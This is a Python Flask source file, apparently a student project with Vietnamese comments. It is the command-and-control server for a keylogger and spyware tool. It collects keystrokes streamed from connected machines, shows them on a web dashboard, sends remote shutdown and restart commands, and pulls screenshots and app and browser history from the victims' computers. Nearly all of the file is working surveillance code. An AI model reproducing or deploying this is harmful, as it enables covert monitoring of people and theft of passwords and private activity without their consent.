import socket
from flask import Flask, request, jsonify, render_template
import sqlite3
import threading
from google.cloud import storage
import firebase_admin
from firebase_admin import credentials, storage

# cred = credentials.Certificate("credentials.json")
# firebase_admin.initialize_app(cred, {"storageBucket": "pbl4-09092003.appspot.com"})

cred = credentials.Certificate("serviceAccountKey.json")
firebase_admin.initialize_app(cred)


app = Flask(__name__)
is_logged_in = False
data_received = ""  

def handle_client(client_socket,client_address):
    global data_received  
    while True:
        try:
            # client_socket, client_address = server_socket.accept()
            print('Nhận kết nối từ', client_address)
            client_socket.send('keylogger'.encode('utf-8'))

            while True:
                data = client_socket.recv(1024)
                if not data:
                    break

                data = data.decode('utf-8')
                data = data.replace("'b'", "")
                data = data.replace("'", "")

                if data == "Key.backspace":
                    data = "back"
                elif data == "Key.f12":
                    break
                else:
                    if data == "Key.shift":
                        data = ""
                    if data == "Key.ctrl_l":
                        data = ""
                    if data == "Key.alt_l":
                        data = ""
                    if data == "Key.tab":
                        data = "\t"
                    if data == "Key.enter":
                        data = "\n"
                    if data == "Key.space":
                        data = "_"
                    else:
                        data = data.replace("Key.", "")

                data_received += data
                print(data, end="")

        except Exception as e:
            print("Error:", str(e))
            client_socket.close()
            break
        finally:
            client_socket.close()
            
def start_socket_server():
    global client_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 8080

    try:
        server_socket.bind(('', port))
        server_socket.listen(5)
        print(f"Server listening on port {port}")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Got connection from {client_address}")

            # Tạo một luồng mới để xử lý kết nối của client
            client_thread = threading.Thread(
                target=handle_client,
                args=(client_socket, client_address)
            )
            client_thread.start()

    except Exception as e:
        print(f"Server error: {str(e)}")
    finally:
        server_socket.close()

def get_screenshots_list():
    # Lấy tham chiếu đến bucket
    bucket = storage.bucket()

    # Lấy danh sách tất cả các đối tượng trong bucket
    blobs = list(bucket.list_blobs())
    
    # Lọc các đối tượng để chỉ lấy các ảnh chụp màn hình
    screenshots_list = [blob.public_url for blob in blobs if blob.name.startswith("screenshot")]

    return screenshots_list

    
@app.route('/', methods=['GET', 'POST'])
def login():
    global is_logged_in  # Declare is_logged_in as a global variable

    if request.method == 'POST':
        username = request.form['name']
        password = request.form['pass']

        # Kết nối đến cơ sở dữ liệu SQLite
        conn = sqlite3.connect('PBL.db')
        cursor = conn.cursor()

        # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
        query = "SELECT * FROM user WHERE username = ? AND password = ?"
        try:
            # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
            cursor.execute(query, (username, password))

            # Kiểm tra xem có người dùng hợp lệ trong cơ sở dữ liệu không
            user = cursor.fetchone()

            # Đóng kết nối đến cơ sở dữ liệu
            conn.close()

            if user:
                is_logged_in = True
                # threading.Thread(target=handle_client).start()
                socket_server_thread = threading.Thread(target=start_socket_server)
                socket_server_thread.start()
                return render_template('index.html', is_logged_in=is_logged_in)
            
            else:
                return "Đăng nhập không thành công. Vui lòng kiểm tra lại tên người dùng và mật khẩu."

        except Exception as e:
            return "Đã xảy ra lỗi: " + str(e)
    return render_template('login.html')

@app.route('/keylogger')
def keylogger_router():
    return render_template('keylogger.html', data_received=data_received)

@app.route('/remote-control',methods=['GET','POST'])
def remote_router():   
    if request.method == 'POST':
        data = request.get_json()
        action = data.get('action')
        print("Action: " ,action)
        
        if action == 'shutdown':
            client_socket.send('shutdown'.encode('utf-8'))
            return jsonify(message='Đã thực hiện thành công hành động shutdown!')

        elif action == 'restart':
            client_socket.send('restart'.encode('utf-8'))
            return jsonify(message='Đã thực hiện thành công hành động restart!')

    return render_template('remote-control.html') 
 
@app.route('/screenshots',methods=['GET','POST'])
def screenshots_router():
    image_url = ""
    if request.method == 'POST':
        data = request.get_json()
        action = data.get('action')
        print("Action: " ,action)
        
        if action == 'takeScreenshot':
            client_socket.send('takeScreenshot'.encode('utf-8'))
            
            try:
                image_url = client_socket.recv(1024).decode('utf-8')
                print("Received image URL:", image_url)
            except Exception as e:
                print("Error receiving image URL:", str(e))
            
        return jsonify({'image_url': image_url})

    return render_template('screenshots.html', image_url=image_url)
  
@app.route('/history',methods=['GET','POST'])
def appHistory_router():
    app = ""
    if request.method == 'POST':
        data = request.get_json()
        action = data.get('action')
        print("Action: " ,action)
        
        if action == 'appHistory':
            client_socket.send('appHistory'.encode('utf-8'))
        elif action == 'webHistory':
            client_socket.send('webHistory'.encode('utf-8'))

        while True:
            app = client_socket.recv(1024).decode('utf-8')
            print(app, end = '\n')

    return render_template('history.html', data=app)  

if __name__ == '__main__':
    app.run(debug=True, port=8000)
